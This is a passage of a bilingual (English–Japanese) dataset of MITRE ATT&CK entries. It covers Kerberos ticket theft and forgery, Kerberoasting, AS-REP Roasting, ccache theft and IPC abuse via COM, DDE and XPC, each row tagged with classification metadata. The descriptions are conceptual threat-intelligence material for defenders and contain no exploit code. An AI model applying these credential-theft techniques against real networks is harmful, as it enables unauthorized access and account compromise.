Eは、使いやすさと広範囲な適用性から、イービルツイン攻撃に導入されることがある。カスタム証明書を使用してHTTPSトラフィックを傍受しようとする場合もある。同様に、攻撃者は既知または過去に接続したネットワーク（優先ネットワークリスト：PNL）へのプローブリクエストを送信するクライアントデバイスを監視することもある。 悪意のあるアクセスポイントがプローブ要求を受信すると、攻撃者は同じSSIDで応答し、信頼された既知のネットワークを模倣します。(引用: specter ops evil twin) 被害者デバイスは応答したアクセスポイントが自身のPNLに属すると誤認し、偽装ネットワークへの接続を開始します。悪意のあるWi-Fiアクセスポイントにログインすると、ユーザーは偽のログインページやキャプティブポータルページに誘導され、認証情報が盗み取られる可能性があります。 ユーザーが偽のWi-Fiネットワークにログインすると、攻撃者はネットワーク活動を監視したり、データを改ざんしたり、追加の認証情報を盗み出したりできる可能性があります。空港、カフェ、図書館など公共Wi-Fiが集中する場所は、攻撃者が不正なWi-Fiアクセスポイントを設置する標的となり得ます。,credential-access;collection,Network Devices,credential_abuse,asset_access,authentication_system;user_interaction;network_connectivity;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP);Wireless Access Point,subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0009,attack-pattern--48b836c6-e4ca-435a-82a3-29c03e5b492e,2024-09-17T14:27:40.947Z,2025-04-15T19:58:27.842Z,,,,
T1558,,Steal or Forge Kerberos Tickets,Kerberosチケットの窃取または偽造,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms E there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting. Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access. On Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)",攻撃者は、[チケット転送](https://attack.mitre.org/techniques/T1550/003)を可能にするため、Kerberosチケットを窃取または偽造してKerberos認証を妨害しようとする可能性があります。Kerberosは現代のWindowsドメイン環境で広く使用されている認証プロトコルです。 Kerberos環境（「レルム」と呼ばれる）には、クライアント、サービス、キー配布センター（KDC）の3つの基本参加者が存在する。(引用元: ADSecurity Kerberos Ring Decoder) クライアントはサービスへのアクセスを要求し、KDCから発行されるKerberosチケットの交換を通じて、認証に成功した後にアクセスが許可される。 KDCは認証とチケット発行の両方を担当します。攻撃者はチケットを窃取したり偽造したりしてKerberosを悪用し、不正アクセスを試みる可能性があります。Windowsでは組み込みの<code>klist</code>ユーティリティを使用して、キャッシュされたKerberosチケットの一覧表示と分析が可能です。(引用元: Microsoft Klist),credential-access,Windows;Linux;macOS,credential_abuse,credential_gain,authentication_system;email_infrastructure,specified,AD / Directory Server;Business Workstation;Mail / Collaboration;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a,2020-02-11T19:12:46.830Z,2025-04-15T19:58:25.352Z,,,,
T1558.001,T1558,Golden Ticket,ゴールデンチケット,"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets) The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.",KRBTGTアカウントのパスワードハッシュを入手した攻撃者は、Kerberosチケット発行チケット（TGT）を偽造できる。これはゴールデンチケットとも呼ばれる。(出典: AdSecurity Kerberos GT Aug 2015) ゴールデンチケットにより、攻撃者はActive Directory内の任意のアカウントに対する認証情報を生成できる。(出典: CERT-EU Golden Ticket Protection) ゴールデンチケットを使用すると、攻撃者はチケット発行サービス(TGS)チケットを要求できるようになり、特定のリソースへのアクセスが可能になります。ゴールデンチケットでは、攻撃者がTGSを取得するためにキー配布センター(KDC)とやり取りする必要があります。(出典: ADSecurity Detecting Forged Tickets) KDCサービスは、Active Directoryドメインの一部であるすべてのドメインコントローラー上で実行されます。 KRBTGTはKerberosキー配布センター（KDC）サービスアカウントであり、全てのKerberosチケットの暗号化と署名を担当します。（引用元：ADSecurity Kerberos and KRBTGT）KRBTGTパスワードハッシュは、[OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)とドメインコントローラーへの特権アクセスを用いて取得される可能性があります。,credential-access,Windows,credential_abuse,credential_gain,authentication_system;privileged_account,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1,2020-02-11T19:13:33.643Z,2025-04-25T14:47:07.443Z,,,,
T1558.002,T1558,Silver Ticket,シルバーチケット,"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets) Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets) Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).",標的サービスアカウント（例：SharePoint、MSSQL）のパスワードハッシュを入手した攻撃者は、Kerberosチケット付与サービス（TGS）チケット（別名シルバーチケット）を偽造できる。Kerberos TGSチケットはサービスチケットとも呼ばれる。(出典: ADSecurity Silver Tickets) シルバーチケットは、特定のリソース（例: MSSQL）とそのリソースをホストするシステムへのアクセスしか許可しない点で、ゴールデンチケットよりも適用範囲が限定されています。しかし、ゴールデンチケットとは異なり、シルバーチケットを偽造できる攻撃者はキー配布センター（KDC）とのやり取りなしにTGSチケットを作成できるため、検出が困難になる可能性があります。(引用元: ADSecurity Detecting Forged Tickets) 対象サービスのパスワードハッシュは、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003) または [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) を使用して取得できる。,credential-access,Windows,credential_abuse,credential_gain,authentication_system;file_storage_access;database_access,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--d273434a-448e-4598-8e14-607f4a0d5e27,2020-02-11T19:14:48.309Z,2025-04-25T14:48:09.547Z,,,,
T1558.003,T1558,Kerberoasting,Kerberoasting,"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016) Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016) This same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015) Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",攻撃者は、有効なKerberosチケット付与チケット（TGT）を悪用するか、ネットワークトラフィックを傍受してチケット付与サービス（TGS）チケットを取得し、[ブルートフォース攻撃](https://attack.mitre.org/techniques/T1110)の脆弱性を悪用する可能性があります。(引用元: Empire InvokeKerberoast Oct 2016)(引用元: AdSecurity Cracking Kerberos Dec 2015)サービスプリンシパル名(SPN)は、Windowsサービスの各インスタンスを一意に識別するために使用されます。認証を有効にするため、KerberosはSPNが少なくとも1つのサービスログオンアカウント（サービスの実行を特に担当するアカウント）に関連付けられていることを要求します(引用元: Microsoft Detecting Kerberoasting Feb 2018)。(引用元: Microsoft SPN)(引用元: Microsoft SetSPN)(引用元: SANS Attacking Kerberos 2014年11月)(引用元: Harmj0y Kerberoast 2016年11月) 有効なKerberosチケット付与チケット(TGT)を保持する攻撃者は、ドメインコントローラー(DC)に対し、任意のSPNに対して1つ以上のKerberosチケット付与サービス(TGS)サービスチケットを要求できます。(引用元: Empire InvokeKerberoast 2016年10月)(引用元: AdSecurity Cracking Kerberos 2015年12月) これらのチケットの一部はRC4アルゴリズムで暗号化される場合があり、これはSPNに関連付けられたサービスアカウントのKerberos 5 TGS-REP etype 23ハッシュが秘密鍵として使用されることを意味し、したがってオフライン[ブルートフォース](https://attack.mitre.org/techniques/T1110)攻撃に対して脆弱であり、平文の認証情報を暴露する可能性がある。(引用元: AdSecurity Cracking Kerberos Dec 2015)(引用元: Empire InvokeKerberoast Oct 2016) (引用元: Harmj0y Kerberoast Nov 2016) ネットワークトラフィックから取得したサービスチケットを使用して、同様の動作を実行することも可能です。(引用元: AdSecurity Cracking Kerberos Dec 2015) 解読されたハッシュは、[永続化](https://attack.mitre.org/tactics/TA0003)、 [権限昇格](https://attack.mitre.org/tactics/TA0004)、および[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスによる[横方向の移動](https://attack.mitre.org/tactics/TA0008)を可能にする可能性がある。(引用元: SANS Attacking Kerberos 2014年11月),credential-access,Windows,credential_abuse,credential_gain,authentication_system;endpoint_execution;network_connectivity;logging_monitoring,specified,AD / Directory Server;Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee,2020-02-11T18:43:38.588Z,2025-04-15T19:59:20.912Z,,,,
T1558.004,T1558,AS-REP Roasting,AS-REP ロースト,"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) Preauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.(Citation: Microsoft Kerberos Preauth 2014) For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",攻撃者は、Kerberosメッセージの[パスワードクラッキング](https://attack.mitre.org/techniques/T1110/002)により、Kerberos事前認証を無効化したアカウントの認証情報を明らかにする可能性がある。(引用元: Harmj0y Roasting AS-REPs Jan 2017)事前認証は、オフラインでの [パスワードクラッキング](https://attack.mitre.org/techniques/T1110/002) に対する保護を提供します。 有効化されている場合、リソースへのアクセスを要求するユーザーは、自身のパスワードのハッシュで暗号化されたタイムスタンプを含む認証サーバー要求（AS-REQ）メッセージを送信することでドメインコントローラー（DC）との通信を開始します。 DC がユーザーのパスワードのハッシュでタイムスタンプを正常に復号できた場合に限り、DC はチケット付与チケット (TGT) を含む認証サーバー応答 (AS-REP) メッセージをユーザーに送信します。 AS-REPメッセージの一部はユーザーのパスワードで署名される。（出典: Microsoft Kerberos Preauth 2014）事前認証が行われていないアカウントに対しては、攻撃者が暗号化タイムスタンプを含まないAS-REQメッセージを送信し、RC4などの安全でないアルゴリズムで暗号化されたTGTデータを含むAS-REPメッセージを受信する可能性がある。 復元された暗号化データは、[Kerberoasting](https://attack.mitre.org/techniques/T1558/003)と同様にオフライン[パスワードクラッキング](https://attack.mitre.org/techniques/T1110/002)攻撃に対して脆弱であり、平文の認証情報を暴露する可能性があります。 (引用: Harmj0y Roasting AS-REPs Jan 2017)(引用: Stealthbits Cracking AS-REP Roasting Jun 2019) ドメインに登録されたアカウント（特権の有無を問わず）は、[PowerShell](https://attack.mitre.org/techniques/T1059/001)などのWindowsツールとLDAPフィルターを活用することで、事前認証が無効化されたドメインアカウントをすべて列挙するために悪用される可能性があります。 あるいは、攻撃者は各ユーザーに対してAS-REQメッセージを送信することも可能です。ドメインコントローラーがエラーなしで応答した場合、そのアカウントは事前認証を必要とせず、AS-REPメッセージには既に暗号化されたデータが含まれています。 (引用: Harmj0y Roasting AS-REPs Jan 2017)(引用: Stealthbits Cracking AS-REP Roasting Jun 2019) 解読されたハッシュは、[永続化](https://attack.mitre.org/tactics/TA0003)、 [権限昇格](https://attack.mitre.org/tactics/TA0004)、および[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスによる[横方向移動](https://attack.mitre.org/tactics/TA0008)を可能にする可能性がある。(引用元: SANS Attacking Kerberos 2014年11月),credential-access,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b,2020-08-24T13:43:00.028Z,2025-04-15T19:58:23.309Z,,,,
T1558.005,T1558,Ccache Files,キャッシュファイル,"Adversaries may attempt to steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials. The <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable are used to set the storage location for ccache entries. On Linux, credentials are typically stored in the `/tmp` directory with a naming format of `krb5cc_%UID%` or `krb5.ccache`. On macOS, ccache entries are stored by default in memory with an `API:{uuid}` naming scheme. Typically, users interact with ticket storage using <code>kinit</code>, which obtains a Ticket-Granting-Ticket (TGT) for the principal; <code>klist</code>, which lists obtained tickets currently held in the credentials cache; and other built-in binaries.(Citation: Kerberos GNU/Linux)(Citation: Binary Defense Kerberos Linux) Adversaries can collect tickets from ccache files stored on disk and authenticate as the current user without their password to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks. Adversaries can also use these tickets to impersonate legitimate users with elevated privileges to perform [Privilege Escalation](https://attack.mitre.org/tactics/TA0004). Tools like Kekeo can also be used by adversaries to convert ccache files to Windows format for further [Lateral Movement](https://attack.mitre.org/tactics/TA0008). On macOS, adversaries may use open-source tools or the Kerberos framework to interact with ccache files and extract TGTs or Service Tickets via lower-level APIs.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)",攻撃者は、認証情報キャッシュファイル（ccache）に保存されたKerberosチケットを盗もうとする可能性があります。これらのファイルは、ユーザーのアクティブなセッション認証情報を短期間保存するために使用されます。ccacheファイルはユーザー認証時に作成され、ユーザーが認証情報を再入力することなく複数のサービスにアクセスできるようにします。 <code>/etc/krb5.conf</code>設定ファイルと<code>KRB5CCNAME</code>環境変数を使用して、ccacheエントリの保存場所を設定します。Linuxでは、認証情報は通常`/tmp`ディレクトリに`krb5cc_%UID%`または`krb5.ccache`という命名形式で保存されます。 macOSでは、ccacheエントリはデフォルトでメモリ内に`API:{uuid}`命名規則で保存されます。通常、ユーザーはチケット保存とのやり取りに<code>kinit</code>（プリンシパル用のチケット付与チケット（TGT）を取得）、<code>klist</code>（認証情報キャッシュ内に保持されている取得済みチケットの一覧表示）、およびその他の組み込みバイナリを使用します。(引用: Kerberos GNU/Linux)(引用: Binary Defense Kerberos Linux) 攻撃者はディスク上のccacheファイルからチケットを収集し、パスワードなしで現在のユーザーとして認証して[Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)攻撃を実行できます。 攻撃者はこれらのチケットを悪用し、昇格した権限を持つ正当なユーザーを装って[権限昇格](https://attack.mitre.org/tactics/TA0004)を実行することも可能です。Kekeoのようなツールは、攻撃者がccacheファイルをWindows形式に変換し、さらなる[横方向移動](https://attack.mitre.org/tactics/TA0008)を行うためにも利用されます。 macOSでは、攻撃者はオープンソースツールやKerberosフレームワークを利用してccacheファイルとやり取りし、低レベルAPI経由でTGTやサービスチケットを抽出する可能性があります。(引用: SpectorOps Bifrost Kerberos macOS 2019)(引用: Linux Kerberos Tickets)(引用: Brining MimiKatz to Unix)(引用: Kekeo),credential-access,Linux;macOS,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;network_connectivity;cloud_control_plane;file_storage_access,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--394220d9-8efc-4252-9040-664f7b115be6,2024-09-17T15:02:31.324Z,2025-04-15T21:56:03.788Z,,,,
T1559,,Inter-Process Communication,プロセス間通信,"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)",攻撃者は、ローカルコードやコマンドの実行のためにプロセス間通信（IPC）メカニズムを悪用する可能性があります。IPCは通常、プロセス間でデータを共有したり、相互に通信したり、実行を同期したりするために使用されます。また、プロセスが循環的な待機パターンに陥るデッドロックなどの状況を回避するためにも一般的に使用されます。攻撃者はIPCを悪用して任意のコードやコマンドを実行する可能性があります。 IPCメカニズムはOSによって異なるが、通常はプログラミング言語/ライブラリや、Windowsの[動的データ交換](https://attack.mitre.org/techniques/T1559/002)や[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)などのネイティブインターフェースを通じてアクセス可能な形で存在する。 Linux環境では複数のIPCメカニズムがサポートされており、その2つがソケットとパイプである（出典: Linux IPC）。[コマンドおよびスクリプトインタプリタ](https://attack.mitre.org/techniques/T1059)などの高レベルな実行環境も、基盤となるIPCメカニズムを活用する場合がある。 攻撃者は、[分散コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1021/003)などの[リモートサービス](https://attack.mitre.org/techniques/T1021)を利用して、リモートIPC実行を促進する場合もある。(引用元: Fireeye Hunting COM June 2019),execution,Windows;macOS;Linux,remote_service_abuse,foothold,endpoint_execution;network_connectivity;email_infrastructure;file_storage_access,specified,Business Workstation;File Server;Mail / Collaboration;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--acd0ba37-7ba9-4cc5-ac61-796586cd856d,2020-02-12T14:08:48.689Z,2025-04-15T19:58:57.325Z,,,,
T1559.001,T1559,Component Object Model,コンポーネントオブジェクトモデル,"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019) Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",攻撃者は、ローカルコード実行のために Windows コンポーネント オブジェクト モデル (COM) を使用する場合があります。 COM は、ソフトウェアオブジェクト間、または 1 つ以上のインターフェイスを実装する実行可能コード間の相互作用を可能にする、ネイティブ Windows アプリケーションプログラミングインターフェイス (API) のプロセス間通信 (IPC) コンポーネントです。(引用元: Fireeye Hunting COM 2019年6月) COM を通じて、クライアントオブジェクトは、通常はバイナリダイナミックリンクライブラリ (DLL) または実行可能ファイル (EXE) であるサーバーオブジェクトのメソッドを呼び出すことができます。(引用元: Microsoft COM) リモートCOM実行は、[分散コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1021/003) (DCOM) などの[リモートサービス](https://attack.mitre.org/techniques/T1021)によって実現される。(引用元: Fireeye Hunting COM 2019年6月) 様々なプログラミング言語（C、C++、Java、[Visual Basic](https://attack.mitre.org/techniques/T1059/005)など）を介して任意の実行を呼び出すために悪用される可能性のある、様々なCOMインターフェースが公開されています。(引用元: Microsoft COM) 特定の COM オブジェクトは、コード実行以外の機能を直接実行するためにも存在します。例えば、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053) の作成、ファイルレスダウンロード/実行、特権昇格や永続化に関連するその他の攻撃者行動などです。(引用元: Fireeye Hunting COM 2019年6月)(引用元: ProjectZero File Write EoP 2018年4月),execution,Windows,remote_service_abuse,foothold,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64,2020-02-12T14:09:53.107Z,2025-04-25T14:46:14.161Z,,,,
T1559.002,T1559,Dynamic Data Exchange,動的データ交換,"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution. Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017) Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection ) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",攻撃者はWindows Dynamic Data Exchange（DDE）を利用して任意のコマンドを実行する可能性がある。DDEはアプリケーション間の一時的および／または継続的なプロセス間通信（IPC）のためのクライアント・サーバープロトコルである。リンクが確立されると、アプリケーションは文字列、ウォームデータリンク（データ項目の変更通知）、ホットデータリンク（データ項目の変更の複製）、コマンド実行要求からなるトランザクションを自律的に交換できる。 オブジェクト・リンキング・アンド・エンベディング（OLE）、すなわち文書間でのデータ連携機能は、当初DDEを通じて実装されていました。[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)に取って代わられたものの、DDEはWindows 10およびMicrosoft Office 2016の大部分において、レジストリキーを介して有効化される可能性があります。(引用元: BleepingComputer DDE Disabled in Word Dec 2017)(引用元: Microsoft ADV170021 Dec 2017)(引用元: Microsoft DDE Advisory 2017年11月) Microsoft Office文書は、直接または埋め込みファイルを介してDDEコマンドで汚染され、[フィッシング](https://attack.mitre.org/techniques/T1566)キャンペーンやホストされたWebコンテンツを介した実行を配信するために使用され、Visual Basic for Applications (VBA)マクロの使用を回避できます。(引用元: SensePost PS DDE 2016年5月)(引用元: Kettle CSV DDE 2014年8月)(引用元: Enigma Reviving DDE 2018年1月)(引用元: SensePost MacroLess DDE 2017年10月) 同様に、攻撃者はWindowsスプレッドシートプログラムで開かれることを意図したCSVファイル内にDDE数式を埋め込むことで、被害者デバイス上でアプリケーションやコマンドを実行するペイロードを感染させる可能性があります。(引用: OWASP CSV Injection)(引用: CSV Excel Macro Injection ) DDE は、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059) に直接アクセスできない、侵害されたマシン上で動作する攻撃者も利用することができます。 DDEの実行は、[分散コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1021/003) (DCOM)などの[リモートサービス](https://attack.mitre.org/techniques/T1021)を介してリモートで呼び出すことが可能です。(引用: Fireeye Hunting COM June 2019),execution,Windows,remote_service_abuse,foothold,user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d,2020-02-12T14:10:50.699Z,2025-04-16T20:37:15.927Z,,,,
T1559.003,T1559,XPC Services,XPCサービス,"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev) Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege 